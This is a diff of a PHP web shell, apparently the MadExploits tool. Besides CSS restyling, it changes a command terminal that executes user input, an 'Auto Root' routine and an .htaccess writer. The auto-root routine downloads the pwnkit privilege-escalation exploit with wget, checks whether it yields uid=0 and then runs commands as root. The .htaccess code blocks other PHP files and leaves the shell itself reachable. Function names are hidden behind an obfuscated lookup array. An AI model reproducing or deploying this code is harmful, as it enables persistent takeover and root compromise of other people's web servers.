@@ -329,9 +329,6 @@ if (!empty($_GET['download'])) {
             left: 0;
             right: 0;
             bottom: 0;
-        }
-
-        .terminal {
             width: 100%;
             height: 100vh;
             background-color: rgba(0, 0, 0, 0.5);
@@ -344,6 +341,7 @@ if (!empty($_GET['download'])) {
         .terminal-body {
             margin: auto;
             margin-top: 60px;
+            z-index: 20;
             width: 90%;
             background: white;
             height: 65vh;
@@ -354,7 +352,7 @@ if (!empty($_GET['download'])) {
         .terminal-body header {
             text-align: center;
             padding: 4px;
-            background: black;
+            background: #1A1A1D;
             color: white;
         }
 
@@ -371,9 +369,9 @@ if (!empty($_GET['download'])) {
         }
 
         .terminal-body header a:hover {
-            background-color: black;
+            background-color: #29292e;
             color: white;
-            border: 1px solid white;
+            border: 1px solid #303038;
         }
 
         .output-terminal {
@@ -426,7 +424,7 @@ if (!empty($_GET['download'])) {
         .file-content {
             width: 90%;
             background-color: white;
-            height: 80vh;
+            height: 70%;
             margin: auto;
             margin-top: 20px;
             color: black;
@@ -434,11 +432,11 @@ if (!empty($_GET['download'])) {
 
         .file-content textarea {
             width: 99.5%;
-            height: 80vh;
+            height: 70vh;
         }
 
         .file-header {
-            background-color: black;
+            background-color: #1A1A1D;
             padding: 15px;
         }
 
@@ -466,18 +464,30 @@ if (!empty($_GET['download'])) {
         }
 
         .file-header li:nth-child(3) a:hover {
-            background-color: black;
+            background-color: #29292e;
             color: white;
-            border: 1px solid white;
+            border: 1px solid #303038;
         }
 
         .file-header li button {
-            color: white;
+            color: black;
             cursor: pointer;
             font-weight: bold;
-            background: none;
+            background: white;
             font-size: 15px;
-            border: none;
+            border: 1px solid white;
+            padding: 10px 15px;
+            margin: -10px -15px;
+            border-radius: 5px;
+        }
+
+        .link-rename {
+            padding: 10px 15px;
+            border: 1px solid white;
+            background-color: white;
+            color: black;
+            border-radius: 5px;
+            margin: -10px -15px;
         }
     </style>
 </head>
@@ -529,11 +539,11 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
             <div class="list-tool">
                 <ul class="tool-menu">
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=terminal" class=""><i class="fa-solid fa-terminal"></i>&nbsp;Terminal</a></li>
-                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=root-terminal" class=""><i class="fa-solid fa-terminal"></i>&nbsp;Terminal Root</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=root-terminal" class=""><i class="fa-solid fa-code"></i>&nbsp;Auto Root</a></li>
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=file" class=""><i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File</a></li>
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=folder" class=""><i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder</a></li>
                     <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= linux_version(); ?>" class=""><i class="fa-solid fa-bug"></i>&nbsp;Localroot Suggester</a></li>
-                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&backdoor=true" class=""><i class="fa-solid fa-virus"></i>&nbsp;Backdoor Remover</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&backdoor=true" class=""><i class="fa-solid fa-virus"></i>&nbsp;Backdoor Destroyer</a></li>
                     <li><a href="https://github.com/MadExploits" class=""><i class="fa-solid fa-book"></i>&nbsp;Readme</a></li>
                 </ul>
             </div>
@@ -677,8 +687,10 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
                         <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a>
                     </header>
                     <form action="" method="post">
-                        <input type="text" placeholder="uname -a" name="terminal" class="terminal-input" autofocus>
-                        <input type="submit" value=">" name="submit-terminal" class="terminal-submit">
+                        <center>
+                            <input type="text" placeholder="uname -a" name="terminal" class="terminal-input" autofocus>
+                            <input type="submit" value=">" name="submit-terminal" class="terminal-submit">
+                        </center>
                     </form>
                     <?php if (isset($_POST['submit-terminal'])) :  ?>
                         <textarea class="output-terminal" disabled><?= htmlspecialchars($fungsi[14]($_POST['terminal'] . " 2>&1")); ?></textarea>
@@ -696,26 +708,40 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
                         <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a>
                     </header>
                     <form action="" method="post">
-                        <input type="text" placeholder="root@terminal~#" name="terminal-root" class="terminal-input" autofocus>
-                        <input type="submit" value=">" name="submit-root" class="terminal-submit">
+                        <center>
+                            <input type="text" placeholder="root@terminal~#" name="terminal-root" class="terminal-input" autofocus>
+                            <input type="submit" value=">" name="submit-root" class="terminal-submit">
+                        </center>
                     </form>
                     <?php if (isset($_POST['submit-root'])) :  ?>
                         <textarea class="output-terminal" disabled>
 <?php
                         $terminal = $_POST['terminal-root'];
-                        echo "[!] Type install for running autoroot\n";
-                        if ($terminal == "install") {
+                        if ($terminal == "root") {
                             echo "[+] Downloading The source \n";
-                            echo _mad_cmd("wget " . $fungsi[34] . " --no-check-certificate");
+                            echo $fungsi[14]("wget " . $fungsi[34] . " --no-check-certificate");
                             echo "[!] Chmod file pwnkit....\n";
-                            echo _mad_cmd("chmod +x pwnkit");
-                            echo "[+] Compiling File pwnkit...\n";
-                            echo _mad_cmd('./pwnkit "id" >> mad-pwnkit');
+                            echo $fungsi[14]("chmod +x pwnkit");
+                            echo "[+] Testing if this kernel vulnerable...\n";
+                            echo $fungsi[14]('./pwnkit "id" >> mad-pwnkit');
+                            $check_vulnerable = $fungsi[27]($fungsi[9]() . "/mad-pwnkit");
+                            $explode_mad_pwkit = explode(" ", $check_vulnerable);
+                            if ($explode_mad_pwkit[0] == "uid=0(root)") {
+                                echo "[~] This Kernel is vulnerable congrats!\n";
+                            } else {
+                                echo "[!] This kernel is not Vulnerable Sorry :)";
+                                return;
+                            }
                             echo "[+] Giving Permission on mad-pwnkit\n";
-                            echo _mad_cmd("chmod +x mad-pwnkit");
-                            echo "[!] Done Sir. now u can running on root user";
+                            echo $fungsi[14]("chmod +x mad-pwnkit");
+                            if (!$fungsi[14]('./pwnkit "id"')) {
+                                echo "[!] Cannot running pwnkit";
+                            } else {
+                                echo "[!] Done Sir. now u can running on root user!";
+                                exit;
+                            }
                         }
-                        echo htmlspecialchars(_mad_cmd('./pwnkit "' . $terminal . '"'));
+                        echo htmlspecialchars($fungsi[14]('./pwnkit "' . $terminal . '"'));
 ?>
                         </textarea>
                     <?php endif; ?>
@@ -751,7 +777,7 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
                     <div class="file-header">
                         <ul>
                             <li><button type="submit" name="submit-file"><i class="fa-regular fa-floppy-disk"></i>&nbsp;Save</button></li>
-                            <li><a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $_GET['f'] ?>"><i class="fa-solid fa-pen-to-square"></i>&nbsp;Rename</a></li>
+                            <li><a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $_GET['f'] ?>" class="link-rename"><i class="fa-solid fa-pen-to-square"></i>&nbsp;Rename</a></li>
                             <li> <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a></li>
                         </ul>
                     </div>
@@ -800,16 +826,31 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
 <?php
 
 if ($_GET['backdoor'] == True) {
-    $base64_text = "PEZpbGVzTWF0Y2ggIi5waCp8UGgqfHBIKnxQSCoiPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJnZWNrby5waHB8aW5kZXgucGhwfGluZGV4Lmh0bWwiPgogICAgT3JkZXIgRGVueSwgQWxsb3cKICAgIEFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4=";
-    $document_root = $_SERVER[$fungsi[33]];
-    $cmd = _mad_cmd("echo '" . base64_decode($base64_text) . "' >> " . $document_root . "/.htaccess");
-    if ($cmd) {
-        echo success();
-    } else {
-        echo failed();
+    // check if htaccess have this code
+    $file_htaccess = $fungsi[27]($_SERVER[$fungsi[33]] . "/.htaccess");
+    $cari_code = explode('"', $file_htaccess);
+    if (!$cari_code[1] == '.ph*|Ph*|pH*|PH*') {
+        // pengecekan nama file sekarang
+        $namafile = $_SERVER['SCRIPT_FILENAME'];
+        $fileUtama = explode("/", $namafile);
+        $htaccess_text = '
+<FilesMatch ".ph*|Ph*|pH*|PH*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+<FilesMatch "' . end($fileUtama) . '|index.php|index.html|*.png">
+    Order Deny, Allow
+    Allow from all
+</FilesMatch>';
+        $document_root = $_SERVER[$fungsi[33]];
+        $cmd = $fungsi[14]("echo '" . $htaccess_text . "' >> " . $document_root . "/.htaccess");
+        if ($cmd) {
+            echo success();
+        } else {
+            echo failed();
+        }
     }
 }
-
 
 if (isset($_POST['submit-chmod'])) {
     $numberChmod = $_POST['chmod'];
